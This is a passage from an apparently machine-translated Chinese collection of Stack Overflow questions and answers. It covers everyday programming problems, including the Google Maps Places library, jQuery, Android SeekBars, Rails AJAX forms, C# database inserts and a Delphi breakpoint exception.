有任何想法吗？

提前致谢。

编辑：我实际上收到以下错误：

未捕获的类型错误：无法读取未定义的属性“自动完成”

不知道为什么，代码放在我的地图初始化函数中。

编辑2：已修复。下面回答。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-01T23:14:09.513

你的修复也对我有用。我正在使用 Geocomplete jQuery 插件[http://ubilabs.github.com/geocomplete/](http://ubilabs.github.com/geocomplete/) 他们主页上的说明说要使用这个

```
<script src="http://maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places"></script> 
```

但这对我不起作用，并且出现了同样的错误。

在此处查看 Google Maps API 的文档 [https://developers.google.com/maps/documentation/javascript/places?hl=en-EN#loading_the_library](https://developers.google.com/maps/documentation/javascript/places?hl=en-EN#loading_the_library)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2017-05-27T15:33:15.327

固定的。自动完成库实际上是一个必须显式加载的单独库。以下行解决了这个问题。

```
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?libraries=places‌​&amp;sensor=false"></scr‌​ipt> 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2019-06-06T13:02:13.693

由于这个问题对我有帮助，我想我会帮助任何在 2019 年遇到此问题的人。在 2019 年，您添加谷歌地图 api 导入，如下所示：

```
https://maps.googleapis.com/maps/api/js?key=YOURAPIKEY 
```

然后将 &libraries=places 添加到末尾，这样所有所说和所做的看起来都像这样：

```
<script async defer
        src="https://maps.googleapis.com/maps/api/js?key=YOURAPIKEY&libraries=places">
</script> 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-08-17T13:17:44.890

如果您使用的是角度应用程序：

如果您使用的是谷歌地图，则必须像这样在 ngmodule 中导入 Api

```
@NgModule({
  declarations: [...],
  imports: [...,
    AgmCoreModule.forRoot({
      clientId: '<mandatory>',
      //apiVersion: 'xxx', // optional
      //channel: 'yyy', // optional
      //apiKey: 'zzz', // optional
      language: 'en',
      libraries: ['geometry', 'places']
    })
  ],
  providers: [...],
  bootstrap: [...]
}) 
```

需要库 'places' 才能使用自动完成模块。

比这样使用它：

```
import {MapsAPILoader} from "@agm/core";
...
constructor(private mapsAPILoader: MapsAPILoader,
...
    this.mapsAPILoader.load().then(() => {
      let autocomplete = new window['google'].maps.places.Autocomplete(..., ...);

      autocomplete.addListener("place_changed", () => { ... 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-11-29T12:31:19.413

您必须将“延迟异步”添加到脚本属性，如下所示：

```
 <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&libraries=places&callback=initMap"
            async defer></script> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-04-01T10:24:28.340

感谢马特的回答！不知何故，`type="text/javascript"`在`<script>`使用`libraries=places`.

不起作用：

```
<script src="http://maps.googleapis.com/maps/api/js?libaries=places&sensor=false&callback=initMap"></script>
<script src="http://maps.googleapis.com/maps/api/js?libaries=places&sensor=false"></script> 
```

作品：

```
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?libraries=places&sensor=false"></script> 
```

回调变体也有效（定义了 initMap 函数）：

```
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?libraries=places&sensor=false&callback=initMap"></script> 
```

这似乎与另一个[SO 答案](https://stackoverflow.com/a/18905094/4955259)一致，并且与[官方文档](https://developers.google.com/maps/documentation/javascript/examples/places-autocomplete-addressform)不一致（除非`key`在 url 中提供了差异）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-02-28T07:31:58.843

我发现此错误是因为我的 API 密钥已超出此 API 的每日请求配额。

我只是创建新的 API 密钥并替换它而不是旧的。

这个对我有用

谢谢你

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-01-24T01:39:35.520

在我的情况下，问题是通过将 Libraries=places 更改为 library=places 来解决的，它似乎区分大小写

# android - 计算其他应用程序中的下载百分比和剩余时间

> ID：11927853
> 
> 赞同：0
> 
> 时间：2012-08-13T03:28:21.383
> 
> 标签：android, http, networking, ftp, download

我想在 Android 中执行以下操作。我想找出 MY APK 中其他应用程序中正在执行的任务的下载百分比和剩余时间。

例如，任务可以是 Http 文件下载、FTP 上传/下载、

Youtube 流媒体，电子邮件下载。

即使下载/上传正在其他应用程序中进行，是否可以在我的应用程序中检索此信息？谁能告诉我可以使用哪些类来实现这一目标。

感谢和问候，

尤维

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T06:13:09.120

这是不可能的，除非有问题的其他应用程序为您提供了一些方法来获取这些数据。而且 AFAIK，没有应用程序提供这样的功能。

在有根设备上，您也许可以监视传入的网络数据并查看它将进入哪个应用程序并估计进度，但我怀疑这可以变成一个合适的应用程序。

# jquery - 使用类名“x”引用 $(this).parent

> ID：11927854
> 
> 赞同：22
> 
> 时间：2012-08-13T03:28:30.610
> 
> 标签：jquery, parent

在 jquery 中，如何使用 of 引用元素的父`$(this)`级？`class``'abc'`

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-08-13T03:30:53.977

像这样：

```
$(this).parents('.abc'); 
```

或者

```
$(this).parent('.abc'); 
```

或者

```
$(this).closest('.abc'); 
```

[`.parent()`](http://api.jquery.com/parent/)和[`.parents()`](http://api.jquery.com/parents/)相似，`.parent()`只是在 DOM 树中只向上移动一层。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:33:34.560

```
<script>$(this).parent(".abc")</script> 
```

[http://api.jquery.com/parent/](http://api.jquery.com/parent/)

# java - 尝试将绝对 URL 从 SVN 转换为 IDE 上的本地文件路径

> ID：11927856
> 
> 赞同：0
> 
> 时间：2012-08-13T03:28:40.680
> 
> 标签：java, svn, eclipse-plugin

我试图通过仅获得来自 SVN 的绝对路径来确定本地文件的确切绝对路径。整个想法是，我正在编写一个 Eclipse 插件，通过知道 SVN 中文件的 URL，您可以单击一行，然后在 eclipse 中本地打开相应的文件。

我遇到困难的地方是试图准确地确定 SVN 路径的结束位置以及实际文件在本地开始的位置。让我举一个实际的例子来演示。

假设 SVN 中文件的绝对 URL 为：

[http://webappsecure.com/svn/discovery/sentinel2jirav4/src/main/java/com/whitehatsecurity/jira/configurations/IPluginConfigurationSettings.java](http://webappsecure.com/svn/discovery/sentinel2jirav4/src/main/java/com/whitehatsecurity/jira/configurations/IPluginConfigurationSettings.java)

可以在用户计算机上的这个位置的 Eclipse 中找到相同的文件：

C:\Users\Steve\workspace\Jira Plugins\Sentinel2Jirav4\sentinel2jirav4\src\main\java\com\whitehatsecurity\jira\configurations\IPluginConfigurationSettings.java

路径的结构肯定存在一些差异。

您会看到 SVN 中的 URL 是怎样的：

/svn/discovery/sentinel2jirav4/

eclipse的本地路径是：

\Jira 插件\Sentinel2Jirav4\sentinel2jirav4\

看起来我可以有一个偏好页面，让用户在其中添加 svn 的路径，例如：/svn/discovery/

因此，我从 SVN 获得的每个绝对 URL 都会一直被切断到 /svn/discovery。

是否有更好的方法将 SVN 路径与其本地路径相关联？SVN 是否存储该本地路径信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:17:42.067

首先，您应该阅读 svn 的本地结构（ .svn 文件夹中的`.svn`文件夹和`entries`文件），这是在第二个结果中获得的`checkout`
，您需要为 %WORKSPACE% 中的所有文件夹解析 .svn/entries。之后，您将确切知道 SVN 中本地文件夹和 url 之间的关系

例如：`src/main/java/com/whitehatsecurity/jira/configurations/IPluginConfigurationSettings.java` 根文件夹内`src`应该是名为的文件夹`.svn`，其中应该是 file `entries`。文件内部`.svn/entries`应包含以下几行：

```
dir
3
http://webappsecure.com/svn/discovery/sentinel2jirav4/src
http://webappsecure.com/svn 
```

或者您可以只`svn info C:\Users\Steve\workspace\Jira Plugins\Sentinel2Jirav4\sentinel2jirav4\src`为每个文件夹运行，其中包含`.svn`内部。结果得到类似的东西

```
Path: workspace\Jira Plugins\Sentinel2Jirav4\sentinel2jirav4\src
URL: http://webappsecure.com/svn/discovery/sentinel2jirav4/src
Repository Root: http://webappsecure.com/src
etc... 
```

# html - Internet Explorer 中的低质量图像调整

> ID：11927858
> 
> 赞同：1
> 
> 时间：2012-08-13T03:28:55.797
> 
> 标签：html, css, image, internet-explorer

我正在开发这个网站： [http ://tulpepwebsite.apphb.com/](http://tulpepwebsite.apphb.com/)

如果您在 Chrome 图像中访问它，在标题或滑块中看起来不错。 ![图尔佩普](../Images/8e2bc52a38bee4466c94fe9dc6def6cc.png)

但如果您在 Internet Explorer 中访问，它看起来是这样的：

![在此处输入图像描述](../Images/b83c0b8c1d8f147e582f282aa0f18e4d.png)

为什么？图像正在 HTML 中调整大小。如果我不想将图像更改为不调整大小，我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T03:44:55.883

不同的浏览器使用不同的算法来调整图像大小。有些会花费更多的 CPU 周期并产生“更好”的图像，而另一些则会进行快速且廉价的 CPU 光缩放，从而导致“更差”的输出。在图像（声音、视频……）处理方面，始终需要在质量和速度之间进行权衡，并且对于采用哪种方法没有通用规则。

150K 对于比普通访客显示器大的图像绝对是大材小用。为页面的特定部分提供特定图像肯定会更好。或者您可以考虑使用矢量图形而不是位图？甚至可能是 HTML5 画布——在不同的浏览器上呈现或多或少相同的可能性（希望如此）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T05:38:57.720

图像在 FireFox 中看起来也不好（看起来类似于 IE）。我建议不要使用 HTML 来调整图像大小，而是使用 Photoshop 或 GIMP（免费）甚至 MS-Paint 之类的图像编辑器来创建较小的图像以在您的网站中使用。目的是网站应该看起来不错。这将有效地解决您的问题。

# android - 使 SeekBar 看起来像 ICS 样式-SeekBar 但允许更改颜色？

> ID：11927860
> 
> 赞同：2
> 
> 时间：2012-08-13T03:29:18.300
> 
> 标签：android, styles, themes, drawable, seekbar

我想制作一个看起来类似于 ICS (Holo) 中的默认 SeekBar 但能够在程序中更改颜色的 SeekBar。我的应用程序以 ICS 为目标，但我需要它与 Froyo 及更高版本保持兼容。

我知道我需要设置进度和拇指可绘制对象，并且我需要能够以编程方式生成这些可绘制对象，以便我可以更改颜色。拇指应该不会太难，因为它只是两个同心圆，外面的一个透明度较低。

我遇到的问题是背景需要是一条只有几个像素高的灰线。如何为可用作 SeekBar 背景的细水平灰线制作 Drawable？

编辑：

我现在使用这个得到了非常接近的东西：

```
private int px_to_dip(int x)
{
    return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, x, res.getDisplayMetrics());
}

@SuppressWarnings("deprecation")
public void setInterfaceColor(int color)
{
    int dip20 = px_to_dip(20);
    int dip40 = px_to_dip(40);
    Bitmap thumbbm = Bitmap.createBitmap(dip40, dip40, Bitmap.Config.ARGB_8888);
    Canvas thumb = new Canvas(thumbbm);
    Paint  thumbp = new Paint(Paint.ANTI_ALIAS_FLAG);
    thumbp.setColor(Color.argb(Color.alpha(color)/2, Color.red(color), Color.green(color), Color.blue(color)));
    thumb.drawCircle(dip20, dip20, dip20, thumbp);
    thumbp.setColor(color);
    thumb.drawCircle(dip20, dip20, px_to_dip(8), thumbp);

    BitmapDrawable thumbdraw = new BitmapDrawable(thumbbm);
    thumbdraw.setBounds(new Rect(0, 0, thumbdraw.getIntrinsicWidth(), thumbdraw.getIntrinsicHeight()));
    sb.setThumb(thumbdraw);
    sb.setThumbOffset(0);

    //int colors[] = {Color.TRANSPARENT, Color.GRAY, Color.TRANSPARENT};
    //GradientDrawable prog = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, colors);
    //prog.setShape(GradientDrawable.RECTANGLE);

    Bitmap progbm = Bitmap.createBitmap(sb.getProgressDrawable().getIntrinsicWidth(), dip40, Bitmap.Config.ARGB_8888);
    Canvas prog = new Canvas(progbm);
    Paint progp = new Paint(Paint.ANTI_ALIAS_FLAG);
    progp.setColor(Color.GRAY);
    prog.drawLine(dip20, dip20, sb.getProgressDrawable().getIntrinsicWidth()-dip20, dip20, progp);
    BitmapDrawable progdraw = new BitmapDrawable(progbm);

    Rect bounds = sb.getProgressDrawable().getBounds();
    sb.setProgressDrawable(progdraw);
    sb.getProgressDrawable().setBounds(bounds);
    sb.refreshDrawableState();
} 
```

问题是背景（应该是一条 1 像素高的灰线）从最左边到最右边，而它应该在拇指的中心开始和结束。拇指是一个圆圈。我还需要调整尺寸。我的 px_to_dip 大部分工作，但尺寸看起来有点偏（在我的 240dpi Galaxy Note (CM9) 和我的 160dpi Archos A43 (CM7) 和 HP TouchPad (CM9) 上测试）。不过，我主要关心在正确位置结束的行，因为这是最烦人的事情。

# jquery - 使用车把 js 对 json 进行迭代的问题

> ID：11927861
> 
> 赞同：0
> 
> 时间：2012-08-13T03:29:19.547
> 
> 标签：jquery, handlebars.js

我正在使用把手 js 来迭代 json 数据对象。但是车把会抛出一个异常，说“depth0”是未定义的。

我是否以适当的方式做一代？

**HTML**

```
<div class="eventlist">                                 
  <ul>                                      
    <script id="event_template" type="text/x-handlebars-template">                          
      <li>{{name}}</li>                             
  </script>                                     
</ul>                               
</div> 
```

**JS**

```
generateEventList = function(){
    var el_tmpl = Handlebars.compile($('#event_template').html());
    $.getJSON('json/events.json' , function(k,v) {
        $('.event-list ul').append(el_tmpl(v.eventList));
    });
}; 
```

**JSON**

```
{ 
 "event": [ 
  { 
     "month": "august", 
     "eventList": { 
        "name": "Event1",
        "name": "Event1",
        "name": "Event2",
        "name": "Event3",
        "name": "Event4",
        "name": "Event5",
        "name": "Event6"
     }, 
     "list": [ 
        { 
           "name": "Comment", 
           "link": "http://www.facebook.com/X999/posts/Y999"
        }, 
        { 
           "name": "Like", 
           "link": "http://www.facebook.com/X999/posts/Y999"
        } 
     ], 
     "type": "status", 
     "created_time": "2010-08-02T21:27:44+0000", 
     "updated_time": "2010-08-02T21:27:44+0000"
  }
 ] 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:00:02.057

我认为您对[`$.getJSON`](http://api.jquery.com/jQuery.getJSON/)成功处理程序获取的参数有点困惑：第一个参数是整个 JSON 响应，第二个是文本状态。

你想用这样的东西[`$.each`](http://api.jquery.com/jQuery.each/)来迭代`eventList`：

```
$.getJSON('json/events.json' , function(data) {
    var $ul = $('.event-list ul');
    $.each(data.event[0].eventList, function(k, v) {
        $ul.append(el_tmpl(v));
    });
}); 
```

所以`k,v`功能继续`$.each`，而不是`$.getJSON`你需要正确挖掘`data`。

如果没有更多上下文，您可能想要`list`代替`eventList`，很难说。

# ruby-on-rails - 验证 Ruby on Rails 应用程序

> ID：11927863
> 
> 赞同：2
> 
> 时间：2012-08-13T03:29:47.223
> 
> 标签：ruby-on-rails, compilation, jruby

在 Web 开发方面，我非常习惯于 ASP.Net 和 Java 世界。虽然我过去做过一些 PHP，但我发现在一个有大量开发人员的 jRuby on Rails 项目上工作有时会在两个人重构相同区域时非常意外地崩溃。

因此，一个人将 MethodA 重命名为 MethodB，而另一个引用 MethodA 的人在签入前不会更新。然后，直到有人专门再次运行该测试场景，我们才发现对 MethodA 的引用中断。

自然地，我们试图通过使用 rspec 和测试客户端的第三方应用程序的自动化测试来尽可能多地覆盖，但是有没有办法几乎“编译”或“验证”一个 Rails 应用程序以确保所有代码路径是正确的，并且没有错误的引用，使用了错误的类型等，就像典型的编译框架一样？

谢谢！

编辑：为了澄清起见，我理解当变量或方法意外地以动态语言重命名时，测试和更新不能总是让人们知道。我本质上是在寻找一种方法来验证 jRuby on Rails 应用程序，以确保没有任何东西被掩盖/遗漏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T06:38:52.360

Ruby 作为一种动态的、鸭子类型的语言的性质使得以您所指的方式编译 Ruby 代码基本上是不可能的。也就是说，请参阅[https://blog.gregbrockman.com/2012/01/static-analysis-in-ruby/](https://blog.gregbrockman.com/2012/01/static-analysis-in-ruby/)。

“...在入住前不更新”？您正在使用什么 VCS 允许这样做？

另外——如果再次运行测试发现错误，那不包括你想要编译的内容吗？您的开发人员不仅不更新就提交，他们也不先运行测试吗？

现在，如果您说对于未更新就提交的开发人员来说测试不会失败，因为他们没有（嗯）更新，那么大概他们的编译也不会失败，所以我认为编译不会有帮助.

# c# - 将数据从datagridview插入数据库

> ID：11927864
> 
> 赞同：1
> 
> 时间：2012-08-13T03:29:53.983
> 
> 标签：c#, sql, database, datagridview, newrow

数据库中有一些现有数据，用户将在我想添加到数据库中的 datagridview 中输入新数据。

而且我真的不知道如何仅将 datagridview 中新插入的数据行添加到数据库中。如何仅获取新插入的数据？有人告诉我可以使用 tempID 将其分配给新插入的行，但我不知道该怎么做。谁能给我一些链接？

这是我现在的代码：

```
private void button1_Click(object sender, EventArgs e)
{
    con = new System.Data.SqlClient.SqlConnection();
    con.ConnectionString = "Data Source=tcp:SHEN-PC,49172\\SQLEXPRESS;Initial Catalog=LSEStock;Integrated Security=True";
    con.Open();
    SqlDataAdapter da = new SqlDataAdapter();

    for (int i = 0; i<dataGridView1.Rows.Count-2; i++ )
    {

        String insertData = "INSERT INTO CostList(SupplierName, CostPrice, PartsID) VALUES (@SupplierName, @CostPrice, @PartsID)" ;
        SqlCommand cmd = new SqlCommand(insertData, con);
        cmd.Parameters.AddWithValue("@SupplierName", dataGridView1.Rows[i].Cells[0].Value);
        cmd.Parameters.AddWithValue("@CostPrice", dataGridView1.Rows[i].Cells[1].Value);
        cmd.Parameters.AddWithValue("@PartsID", textBox1.Text);
        da.InsertCommand = cmd;
        cmd.ExecuteNonQuery();
    }

    con.Close();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:08:19.873

我认为您应该以不同的方式处理数据网格插入。看一下这个：

[http://www.codeguru.com/csharp/.net/net_data/datagrid/article.php/c13041/Add-Edit-and-Delete-in-DataGridView.htm](http://www.codeguru.com/csharp/.net/net_data/datagrid/article.php/c13041/Add-Edit-and-Delete-in-DataGridView.htm)

我不认为允许本地工作然后插入所有新行是最好的方法，因为当有数据绑定时，网格能够让用户将新行插入数据库。该示例执行数据库异步调用以释放 UI。

我也认为您至少应该使用 StringBuilder 进行查询；更易于管理，我希望您不会真的像那样将连接字符串留在那里。

# facebook - 我搜索获取 facebook 位置 ID 的方式

> ID：11927866
> 
> 赞同：0
> 
> 时间：2012-08-13T03:30:14.657
> 
> 标签：facebook, facebook-graph-api

我现在正在使用 Facebook API。

我想我想查看地点列表。
*请求网址
[https://graph.facebook.com/search?type=place¢er=35.6589,139.701283&distance=500&access_token=token](https://graph.facebook.com/search?type=place&center=35.6589,139.701283&distance=500&access_token=token)

这是成功的，但我想在这些地方添加新的地点。
这是问题。我现在没有办法了。

我的形象是这样的。

*我的系统将新地点发布到具有地点数据参数的地点。

```
parameter example:
name: test store,
category: Local business,
location:{
   street: test town 1-1-1,
   city: Sibuya-ku,
   state: Tokyo
   country: Japan,
   zip: 150-0001,
   latitude: 35.121313123,
   longitude: 139.123456,
} 
```

*如果该参数被Facebook ok, , Facebook 系统返回spot_id。

facebook有这样的功能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T08:44:05.310

从查询中可以看出，每个地方都有一个 Facebook id，因为用户可以签入的每个地方实际上都是一个 Facebook 页面。

所以你想要做的就是即时*创建*Facebook 页面——我不认为 Facebook 会喜欢这种情况，因为我们最终会得到很多只使用一次的“虚拟”页面，并且将没有实际活动，因此现在对 FB 用户群具有价值。

根据您实际想要对您喜欢创建的“现场”信息执行的操作，也许您可​​以使用 Open Graph 对象自行设置，并让用户对您的这些对象执行操作。

# ruby - 我怎样才能让 webrat 跟随重定向

> ID：11927868
> 
> 赞同：0
> 
> 时间：2012-08-13T03:30:28.557
> 
> 标签：ruby, tdd, cucumber, bdd, webrat

我的场景中有以下内容：

```
And I click the link Log out
Then I should see the login page 
```

单击该`Log out`链接会将用户发送到 /log_out，该链接将重定向回登录页面。Webrat 失败，因为它正在寻找“登录”，但 log_out 页面为空（它只是一个破坏会话并重定向到 / 的 codeigniter 函数）

让 webrat 意识到它需要在重定向结束时读取页面的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T06:39:11.277

一种简单但低效的方法是仅在执行重定向所需的大致时间添加睡眠。

```
And I click the link Log out
And I wait for 5 seconds
Then I should see the login page 
```

步骤定义

```
When /^I wait for (\d+) seconds$/ do |time|
  sleep time.to_i
end 
```

但是，当涉及到网络延迟时，此解决方案非常脆弱，您的等待可能太长或太短。更好的方法是睡觉直到您要查找的内容出现。

```
And I click the link Log out
Then within 30 seconds, I should see the login page 
```

步骤定义

```
Then /^within (\d+) seconds, I should see the login page$/ do |time|
  sleep time.to_i until page.has_text? "Login"
  page.should have_content "Login"
end 
```

如果您发现自己使用等待其他步骤，则可以概括逗号后的其余步骤。

# actionscript-3 - 如何将文件附加到 swf(Actionscript)

> ID：11927874
> 
> 赞同：0
> 
> 时间：2012-08-13T03:31:06.207
> 
> 标签：actionscript-3, flash, actionscript

有没有办法将一些文件附加到 swf，因为现在我必须将所有文件放在 swf 文件所在的同一文件夹中，我想在编译中附加所有图像、mp3 等文件，并且将来不依赖外部文件，这可能吗？

```
[Embed (source="mb.mp3" )] 
```

我已经尝试过了，但它不会将文件保存在 swf 中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T05:59:42.017

将所有 mp3 文件添加到一个新的 Fla 文件中并将其编译为 swc/swf。如果您编译为 swc，则可以通过链接到之前编译的 swc 文件中将其包含到您的原始 swf 中。如果将库文件编译为 SWF，则可以在运行时动态加载该文件，然后在库中创建项目的实例。

两种解决方案都“要求” mp3/图像文件存在于具有链接标识符的库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T06:19:18.840

您也可以通过此创建 as3 代码

```
 [Embed(source="sample.mp3")]
 [Bindable]
 public var sampleMp3Cls:Class; 
```

并且 sample.mp3 必须在**assets**目录中，否则您必须提供**Assets**目录的相对路径。

看看[如何嵌入资产](http://livedocs.adobe.com/flex/3/html/help.html?content=embed_4.html)。可能这个链接会有所帮助。

# javascript - Javascript代码以相反的顺序执行？

> ID：11927876
> 
> 赞同：0
> 
> 时间：2012-08-13T03:31:22.300
> 
> 标签：javascript, jquery

这是我的js的一部分：

```
window.location.reload();
$("#status").html('Try'); 
```

我希望页面重新加载，然后将“try”写入 div“#status”。但相反的情况发生了：div“#status”被写入了一小段时间，然后它消失了，然后页面重新加载，其中“#status”再次为空。

如何让它们以正确的顺序执行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T03:39:25.140

如果这是在您执行的方法中，您可能会看到更改 html 的效果，因为页面确实及时启动以重新加载。但是这段代码是以正确的顺序执行的。它只是 location.reload 需要更多时间来执行，然后只需更改元素的 innerHtml 。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T04:02:44.093

`window.location.reload();`将事件发送到浏览器。因此，从技术上讲，该事件已被执行并移至下一行。

您上面的评论似乎暗示您想要更多的是负载一次，然后向 div 添加一些内容。我可能会使用 URL 中的哈希值来阅读这个......

```
var pageHash = window.location.hash;
if(pageHash.indexOf("firstLoad") == -1) {
    //The page hasn't been loaded, so reload
    window.location = window.location.origin + window.location.pathname + "#firstLoad";
} else {
    $("#status").html('Try');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T05:28:47.477

Alegro 这可以帮助你的情况

```
setTimeout(function(){window.location.reload();},5000); 
$("#status").html('Try'); 
```

因此将显示消息，并且在 5 秒后页面将重新加载。

# delphi - 如何摆脱异常 80000003？

> ID：11927877
> 
> 赞同：14
> 
> 时间：2012-08-13T03:31:24.017
> 
> 标签：delphi

当我运行我的程序时（诚然，它是在调试模式下构建的），我收到一个错误“外部异常 80000003”。

根据[Win32 Exception/Access Violation Errors](http://www.support.tabs3.com/main/R10309.htm)这意味着`0x80000003 EXCEPTION_BREAKPOINT A breakpoint was encountered.`

但是，IDE 中没有设置断点，我在 IDE 之外运行它。

是的，我有正确的可执行文件。我删除了所有断点，清理了我的项目并重新构建它，但仍然是那个对话框。我什至删除了.exe，重新构建，看到它出现在预期的位置。验证 .exe 上的时间戳。我在 FromCreate() 中添加了一个消息框并看到了它，加上“外部异常 80000003”。

我如何让它消失（在调试模式下构建）？

* * *

哦！！这是旧代码，我忘记了我实际上是在一个错误条件下编写`asm int 3 end;`的，它向 IDE（或 Windows，如果 IDE 未运行，因此会出现错误框）发出断点信号。为浪费时间道歉。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-13T03:56:29.143

断点本质上是一个机器级指令（操作码？），它会导致 CPU 处理暂停并引发异常类型的信号。这通常由操作系统拾取，然后进入一些用户进程，如调试器或类似的。

当我拥有这个时，几乎总是当我的代码跳入某个数据空间时。我几乎总是这样说，因为我偶尔也会在调试一些噩梦时意外地将断点硬编码到代码中（！）。

编辑：正如@Ken White 所说，int 3（断点中断）是我用来硬编码的那个:-)

我要做的第一件事是获取堆栈跟踪和工作后备词。

# javascript - 如何使用表单更新视图中的模型列表而不使用rails中的javascript（coffeescript）刷新？

> ID：11927882
> 
> 赞同：1
> 
> 时间：2012-08-13T03:32:44.037
> 
> 标签：javascript, jquery, ruby-on-rails, forms, coffeescript

从根本上说，我试图将几个默认的 rails 视图合并为一个，并使用 javascript（实际上是 coffeescript）来避免重新加载页面。基本上我想结合标准生成的新函数和索引函数中的内容，以便在创建新对象时更新列表而无需刷新页面。

我想这是许多应用程序中的常用技术，尽管我还没有找到关于它的教程。我已经尝试从 StackOverflow 和其他地方的帮助中拼凑出一个解决方案，但还没有完全发挥作用。我决定创建一个简单的 Rails 项目，因为我需要帮助来解决这个问题，因此其他人可以跟进，而不会陷入特定于我的应用程序的事情中。

下面是代码。有很多，但大部分都是标准的，由 rails 生成。我创建了一个 rails 项目（rails 3.2）并为具有两个字符串、一个标题和一个作者的 Book 生成了脚手架（模型、控制器、视图）。然后我进一步修改了代码如下。

我确保`Gemfile`包含`jquery-rails`

```
gem 'rails', '3.2.7'

....

group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'
  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails' 
```

然后我为列表操作添加了一条新路线`Routes.rb`

```
...
match 'books/list' => 'books#list'
resources :books 
```

接下来将动作添加到控制器`books_controller.rb`

```
...
def list
  @all_books = Book.all
  @book = Book.new

  respond_to do |format|
    format.html # new.html.erb
    format.js { render 'new_book_row', :format => :html, :layout => false }
    format.json { render json: @book }
  end
end 
```

我确保同时拥有`@book`新书和`@all_books`用于列出所有书籍的表格。

该`format.js`行应将新表行（下面给出的文件）呈现为 html（将布局设置为 false，因此它只呈现部分而不是应用程序视图包装器）。

我们在中创建相应的视图和局部视图`views/books/`

`list.html.erb`包含

```
<h1>List Books</h1>

<h3>Add Book</h3>
<%= render 'new_book_form' %>

<h3>My Books</h3>
<%= render 'book_list' %>

<%= link_to 'Back', books_path %> 
```

我把它分成了两个部分，尽管显然这些部分可以折叠到上面的视图中。

部分`_new_book_form.html.erb`如下

```
<%= form_for @book, :remote => true, :html => { 'data-type' => :html } do |f| %>
  <% if @book.errors.any? %>
    <div id="error_explanation">
      <h2><%= pluralize(@book.errors.count, "error") %> prohibited this book from being saved:</h2>

      <ul>
      <% @book.errors.full_messages.each do |msg| %>
        <li><%= msg %></li>
      <% end %>
      </ul>
    </div>
  <% end %>

  <div class="field">
    <%= f.label :title %><br />
    <%= f.text_field :title %>
  </div>
  <div class="field">
    <%= f.label :author %><br />
    <%= f.text_field :author %>
  </div>
  <div class="add-button" id='add-button'>
    <%= f.submit %>
  </div>
<% end %> 
```

除了 form_for 调用之外，它都是标准生成的代码。我按照[http://tech.thereq.com/post/18910961502/rails-3-using-form-remote-true-with-jquery-ujs](http://tech.thereq.com/post/18910961502/rails-3-using-form-remote-true-with-jquery-ujs)`:remote => true`中的描述进行设置，使其成为 ajax 调用。我需要进行设置，以便响应以 html 而不是脚本的形式出现。`'data-type' => :html`

`_book_list.html.erb`部分也是所有标准生成的代码

```
<table id='book-list'>
  <tr>
    <th>Title</th>
    <th>Author</th>
    <th></th>
    <th></th>
    <th></th>
  </tr>

<% @all_books.each do |book| %>
  <tr>
    <td><%= book.title %></td>
    <td><%= book.author %></td>
    <td><%= link_to 'Show', book %></td>
    <td><%= link_to 'Edit', edit_book_path(book) %></td>
    <td><%= link_to 'Destroy', book, method: :delete, data: { confirm: 'Are you sure?' } %></td>
  </tr>
<% end %>
</table> 
```

也`_new_book_row.html.erb`很简单

```
<tr>
  <td><%= new_book.title %></td>
  <td><%= new_book.author %></td>
  <td><%= link_to 'Show', new_book %></td>
  <td><%= link_to 'Edit', edit_book_path(new_book) %></td>
  <td><%= link_to 'Destroy', new_book, method: :delete, data: { confirm: 'Are you sure?' } %></td>
</tr> 
```

魔法就在`books.js.coffee`

```
# don't load javascript until the whole page is laid out
$(document).ready ->

  # To save the book without reloading the page
  $('#add-button').click ->
    $(this).parents("form").submit()

  $('form#new_book').on 'ajax:success',  (xhr, data, status) ->
    $('#book-list').append(data).show() 
```

我发现我需要延迟添加加载 javascript，直到页面加载完成，否则找不到元素（当你想到它时，这并不奇怪）。

* * *

`/books/list`正确显示页面，并且按钮确实创建了带有表单字段的 Book 模型的新实例，而不呈现默认`/books/<id>`页面。

然而

1.  这不是刷新表。
2.  它似乎正在创建对象的两个实例。
3.  它没有渲染部分（我也尝试过不带前导下划线的非部分），而是返回 html `/books/<id>`（但再次执行两次），如下所示。

Dynamicdisplay ... ... 重新加载页面以获取源： /assets/books.css?body=1 ... ... 图书已成功创建。

**书名：** 老人与海

**作者：** 海明威

[编辑](/books/14/edit) | [返回](/books) Dynamicdisplay ... ... 图书创建成功。

**书名：** 老人与海

**作者：** 海明威

[编辑](/books/15/edit) | [后退](/books)

